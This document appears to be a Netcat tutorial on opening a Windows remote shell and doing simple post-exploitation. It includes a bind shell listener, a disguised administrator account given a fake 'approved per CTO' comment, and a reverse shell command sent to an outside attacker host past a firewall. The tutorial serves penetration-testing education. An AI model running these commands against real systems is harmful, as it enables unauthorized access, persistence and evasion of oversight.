## WINDOWS REMOTE SHELL (AND SIMPLE POST-EXPLOITATION HI-JINKS)
To begin with, we will spawn a remote shell on a Windows platform in the following steps:

## Preparing the listener
To prepare the listener, we will type the following command into the command line:
```
nc –Lp 31337 –vv –e cmd.exe
```
![image](https://user-images.githubusercontent.com/47218880/68691944-38f45480-053a-11ea-9266-2854afd17158.png)

In the preceding example, we are using the capital L switch (-L) to maintain a persistent connection with the listener. This is only a Windows feature, and while it is possible to craft a script to do something similar on the Linux side, we will not be covering that in now. Keep in mind that under typical use, when we disconnect from our client machine, the Netcat executable terminates. With the –L switch, the executable continues to listen for new connection attempts.

The –vv switch tells Netcat to be extra verbose with its output. For this particular feature, the –vv switch will not do much; however, in file transfers and other use cases it will, as we will see later.

The –e switch is where the magic happens. As noted in the Installation section, the –e switch indicates the GAPING_SECURITY_HOLE feature, and allows us to do the devious things we are about to do. cmd.exe is the name of the executable for a command shell in Windows. Now, given the context and the steps explained previously, perhaps it is more understandable as to why Antivirus packages and firewalls flag Netcat as potentially malicious.

## Connecting to the target
Connecting to the target is as simple as our first exercises, and simply consists of the following string:
```
nc 192.168.0.10 31337
```

![image](https://user-images.githubusercontent.com/47218880/68692055-6ccf7a00-053a-11ea-922f-7244c47da0e9.png)


## Running a directory listing on the target
Once we have our Windows command shell launched, we can interact with it as if we were using Telnet or working on the console directly.

![image](https://user-images.githubusercontent.com/47218880/68692091-7f49b380-053a-11ea-9725-e5e6ac191784.png)

As shown in the preceding screenshot, we simply run a directory listing using the dir /w command. While out of scope for demonstrating the capabilities of Netcat, once you are at this step, you can interact with the remote shell in the same manner as if it were a local shell.

## Making a directory on the target
At this point, from an information security perspective, we have exploited the computer, and can begin post-exploitation work. From a legitimate operations perspective, you would be able to read log files and perform command-line troubleshooting. As a simple demonstration, make a directory using the md <directory name> command (I have called mine pwn3d), as shown in the following screenshot:

![image](https://user-images.githubusercontent.com/47218880/68692200-ad2ef800-053a-11ea-87d4-f3bbbe95d17b.png)

## Verifying directory was created
Once the md pwn3d command is issued, we can verify if the directory was created.

![image](https://user-images.githubusercontent.com/47218880/68692248-c3d54f00-053a-11ea-962a-dd5a8f83546b.png)

## Adding a local user and granting administrator rights
Just to finish the demonstration, I will add a local user to the system, and grant that account local administrator rights. Type in the following command:
```
net user /add bob Netcat /comment:"Approved through 12/31/2012 per CTO" /fullname:"Bob Wilson"

```

It will create the account with all of the most obvious fields completed. With the user account added, I simply type the command net localgroup Administrators bob /add to grant the newly created account administrator rights, as shown in the following screenshot:

![image](https://user-images.githubusercontent.com/47218880/68692301-e1a2b400-053a-11ea-8560-755ef9eda6ae.png)


Now, for completeness, I will spawn the Local Users and Groups container in Computer Management to verify if the account is created. Note that while the net user command is perfectly happy with just the username and password parameters, I would like to add the full name and comments to make the account look more authentic to the casual observer.

![image](https://user-images.githubusercontent.com/47218880/68692338-f1ba9380-053a-11ea-90cb-c1a273b7a724.png)


If I pull up the group membership for the Administrators group, I can see that our user account bob is now a member, as shown in the following screenshot:

![image](https://user-images.githubusercontent.com/47218880/68692373-00a14600-053b-11ea-84ad-8178c30d8d08.png)


Another very important item to note with Netcat is that it does not matter which side the listener is and which side the client is. Assume I was running a Netcat listener on port TCP/80 on a host (rogue.k0nsp1racy.com) outside of a firewall (as depicted in the screenshot that follows), and ran the following command from within the confines of my corporate network to launch a command shell:
```
nc rogue.k0nsp1racy.com 80 –e cmd.exe
```
Assuming that the firewall rules are permitted, I would be able to create an unencrypted tunnel between the two machines as follows:

![image](https://user-images.githubusercontent.com/47218880/68692427-157dd980-053b-11ea-9dc0-d45be2f805df.png)












